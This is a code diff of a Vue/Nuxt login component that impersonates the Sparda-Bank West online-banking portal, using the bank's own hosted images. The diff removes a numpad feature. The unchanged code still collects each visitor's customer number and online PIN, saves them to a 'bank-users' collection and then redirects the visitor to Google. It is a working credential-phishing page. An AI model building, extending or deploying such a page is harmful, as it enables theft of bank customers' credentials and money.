@@ -6,21 +6,21 @@
                 <label for="user">Kundennummer</label>
             </div>
             <input ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
-            <img @click="openNumpad(0)" title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
+            <img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
         <div class="input pin">
             <div class="textField">
                 <label for="onlinePin">Online-Pin</label>
             </div>
             <input ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
-            <img @click="openNumpad(1)" title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
+            <img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
     </div>
     <button id="loginBtn" ref="loginBtn">
         <img title="Jetzt einloggen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png" @click="sendData">
     </button>
 
-    <Numpad />
+    <InWork />
 
 </template>
 
@@ -78,10 +78,8 @@
 
 <script lang="ts" setup>
 
-    import { ref, Ref, provide } from 'vue';
+    import { ref, Ref } from 'vue';
     const { create } = useStrapi();
-
-    const numpad = inject<any>('numpad');
 
     interface InputData {
         value: HTMLInputElement | null | undefined;
@@ -90,8 +88,6 @@
     const inputUser: Ref<InputData> = ref({ value: null });
     const inputPin: Ref<InputData> = ref({ value: null });
     const loginBtn: Ref = ref({ value: null });
-    provide('inputUser', inputUser);
-    provide('inputPin', inputPin);
     
     async function sendData(){
         await useAsyncData('bank-users', () => create('bank-users', {
@@ -99,10 +95,6 @@
             onlinePin: inputPin.value.value
         }));
         await navigateTo('https://www.google.com/', { external: true });
-    }
-
-    function openNumpad(id: 0 | 1) {
-        console.log(numpad);
     }
 
 </script>
